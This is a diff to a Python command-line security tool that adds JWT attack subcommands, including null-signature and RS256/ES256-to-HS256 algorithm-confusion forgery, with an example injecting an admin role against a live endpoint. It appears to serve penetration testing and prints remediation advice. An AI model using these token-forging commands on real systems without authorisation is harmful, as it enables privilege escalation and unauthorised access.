@@ -4310,6 +4310,19 @@ def jwt(ctx):
       python apileaks.py jwt login --url http://HOST/api/v1/login \\
           --body '{"username":"user","password":"pass"}' --save token.jwt
 
+    Available Commands:
+      decode              Decode and analyze JWT tokens
+      encode              Create JWT tokens with custom payloads
+      verify              Verify a token signature against key material (no network)
+      test-alg-none       Test algorithm confusion (alg:none) attacks
+      test-null-signature Test null signature bypass attacks
+      test-alg-confusion  Test RS256/ES256 -> HS256 key confusion (substitution)
+      brute-secret        Brute-force weak HMAC secrets
+      test-kid-injection  Test Key ID (kid) injection vulnerabilities
+      test-jwks-spoof     Test JWKS URL spoofing attacks
+      test-inline-jwks    Test inline JWKS injection attacks
+      attack-test         Comprehensive automated attack testing (NEW)
+    
     Use 'python apileaks.py jwt COMMAND --help' for detailed help on any command.
     """
     pass
@@ -4684,6 +4697,101 @@ def jwt_test_null_signature(ctx, token, payload, url, header, data, timeout):
         custom_headers = _parse_custom_headers(header)
 
         # Decode original token for display
+        decoded = decode_jwt(token)
+        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
+        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
+        click.echo("")
+
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). A custom payload is merged onto
+        # the base token before running the vector.
+        base_token = token
+        if payload:
+            try:
+                custom_payload = json.loads(payload)
+            except json.JSONDecodeError:
+                click.echo(f"❌ Invalid JSON payload: {payload}")
+                return
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.NULL_SIGNATURE, url, custom_headers,
+                        data, timeout)
+
+        click.echo(f"\n💡 REMEDIATION:")
+        click.echo("• Implement proper signature validation - never accept empty signatures")
+        click.echo("• Validate signature length and format before verification")
+        click.echo("• Use established JWT libraries with proper validation")
+        click.echo("• Implement signature presence checks before cryptographic verification")
+
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
+        sys.exit(1)
+
+
+def _load_public_key_material_cli(material):
+    """Resolve operator-supplied public-key material for the CLI.
+
+    ``material`` may be a filesystem path to a PEM/DER file or inline PEM
+    text. Returns raw bytes when a readable file is found (so binary DER works),
+    otherwise the original string (inline PEM). Mirrors the auth module's
+    path-or-inline resolution so both entry points behave identically.
+    """
+    try:
+        path = Path(material)
+        if path.exists() and path.is_file():
+            return path.read_bytes()
+    except (OSError, ValueError):
+        pass
+    return material
+
+
+@jwt.command('test-alg-confusion')
+@click.argument('token')
+@click.option('--public-key', 'public_key', required=True, metavar='PATH_OR_PEM',
+              help='Target RSA/EC public key (PEM/DER file path or inline PEM) used as the HMAC secret')
+@click.option('--payload', help='Custom payload to inject (JSON format)')
+@click.option('--url', '-u', help='Target URL to test the confusion attack against (optional)')
+@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
+@click.option('--data', '-d', help='POST data for endpoint testing')
+@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
+@click.pass_context
+def jwt_test_alg_confusion(ctx, token, public_key, payload, url, header, data, timeout):
+    """Test algorithm/key confusion attack (RS256/ES256 -> HS256 substitution)
+
+    \b
+    🧪 CRITICAL SEVERITY ATTACK
+    Algorithm confusion (aka Substitution Attack) forges a token that a server
+    validates with the SAME public key it uses for RS*/ES* verification, but
+    treated as an HS256 HMAC secret:
+
+    1️⃣ Switch the header alg from RS256/ES256 to HS256\b
+    2️⃣ HMAC-sign header.payload using the server's PUBLIC KEY bytes as the secret\b
+    3️⃣ Every public-key representation is tried (PEM ±newline, DER, x5c cert)\b
+    4️⃣ A server that accepts the forged token confuses the key's role
+
+    \b
+    Examples:
+      # Generate confusion tokens for manual testing
+      python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem
+
+      # Inject an admin payload and test against a live endpoint
+      python apileaks.py jwt test-alg-confusion TOKEN --public-key key.pem \\
+          --payload '{"role":"admin"}' --url https://api.example.com/admin
+    """
+    try:
+        click.echo("🔍 Algorithm/Key Confusion Attack (RS256/ES256 -> HS256)")
+        click.echo("="*55)
+        click.echo("🔥 SEVERITY: CRITICAL - Signature forged with the public key")
+        click.echo("")
+
+        custom_headers = _parse_custom_headers(header)
+
+        # Decode original token for display
+        public_key_material = _load_public_key_material_cli(public_key)
+
+        # Decode original token for display.
         decoded = decode_jwt(token)
         click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
